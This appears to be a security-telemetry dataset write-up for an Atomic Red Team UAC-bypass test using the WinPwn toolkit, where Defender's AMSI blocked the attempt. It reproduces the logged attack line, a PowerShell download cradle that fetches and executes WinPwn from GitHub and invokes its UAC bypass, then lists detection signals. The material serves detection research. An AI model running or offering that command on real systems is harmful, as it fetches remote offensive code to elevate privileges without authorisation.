# T1548.002-18: Bypass User Account Control — WinPwn - UAC Magic

## Technique Context

T1548.002 (Bypass User Account Control) covers techniques that silently elevate process privileges. WinPwn is a PowerShell-based offensive toolkit by S3cur3Th1sSh1t that bundles multiple UAC bypass methods, among other post-exploitation capabilities. The "magic" technique in WinPwn's `UACBypass` function is a specific UAC bypass method delivered as a PowerShell script, downloaded live from GitHub at execution time. Unlike UACME's binary approach, WinPwn operates entirely in PowerShell, making it suitable for environments where binary drops are monitored or restricted.

## What This Dataset Contains

The dataset captures approximately 8 seconds of activity on ACME-WS02 (Windows 11 Enterprise, domain member of acme.local).

**PowerShell script block logging (4104)** preserves the exact attack invocation:

```
{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic}
```

**PowerShell Event 4100** (error/warning) records the AMSI block:

```
Error Message = At line:1 char:1
+ #  Global TLS Setting for all functions. If TLS12 isn't supported...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

This confirms Windows Defender's AMSI integration blocked `WinPwn.ps1` immediately upon download and attempted execution via `Invoke-Expression`.

**Sysmon Event 22** (DNS query): `raw.githubusercontent.com` resolved successfully (185.199.108–111.133) — the download was attempted.

**Sysmon Event 3** (network connection): `powershell.exe` connected to `185.199.111.133` on port 443, confirming the HTTPS download initiated.

**Sysmon Event 1**: `whoami.exe` (pre-check) and a new `powershell.exe` spawned for the attack payload.

**PowerShell 4103**: `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force` (ART test framework boilerplate, two instances), and `New-Object` with TypeName `net.webclient` confirming the download object was instantiated before the block.

**Sysmon Events 7** document DLL loads into `powershell.exe` instances; Event 17 records named pipe creation.

## What This Dataset Does Not Contain (and Why)

**No WinPwn execution or elevated payload**: Windows Defender's AMSI integration blocked `WinPwn.ps1` before `UACBypass` could run. The `cmd.exe` payload specified in the `-command` argument was never launched. No elevated process creation appears anywhere in the dataset.

**No WinPwn script content beyond the invocation**: AMSI blocked the script at the point of `Invoke-Expression`, so the full WinPwn function definitions were never logged as script blocks. Only the calling wrapper appears in 4104.

**No Sysmon file creation for WinPwn.ps1**: The script was downloaded into memory via `net.webclient.DownloadString()` and never written to disk, so no Event 11 appears for the payload itself.

**No registry modifications**: The "magic" technique did not reach the stage where it would write to auto-elevate COM handler keys.

## Assessment

Windows Defender with AMSI blocked WinPwn before the UAC bypass technique executed. The dataset is an example of a blocked attempt: the download and invocation are fully observable in the telemetry, but no bypass-specific activity beyond the initial download occurred. This pattern — where instrumentation captures the attempt but not the technique — is valuable for training detectors on the pre-block signals.

## Detection Opportunities Present in This Data

- **PowerShell 4100**: `ScriptContainedMaliciousContent` error from `InvokeExpressionCommand` is a direct indicator that AMSI flagged downloaded content. The presence of this event alongside a 4104 with `downloadstring` and `github.com` is a strong detection anchor.
- **PowerShell 4104**: Script block containing `iex(new-object net.webclient).downloadstring(...)` combined with a GitHub raw URL and `UACBypass` function call is highly indicative. Even without the AMSI block, this pattern should trigger.
- **Sysmon Event 22**: DNS query for `raw.githubusercontent.com` from `powershell.exe` running as SYSTEM warrants investigation, particularly when followed immediately by a Sysmon Event 3 connection.
- **Sysmon Event 3**: `powershell.exe` (SYSTEM) establishing outbound HTTPS to GitHub CDN IP ranges is anomalous on a managed domain workstation and should be alerted on regardless of whether a download succeeds.
- **Behavioral sequence**: DNS resolution → TCP connection → `ScriptContainedMaliciousContent` error, all within 1 second, is a reliable detection pattern for AMSI-blocked live-off-the-web attacks.
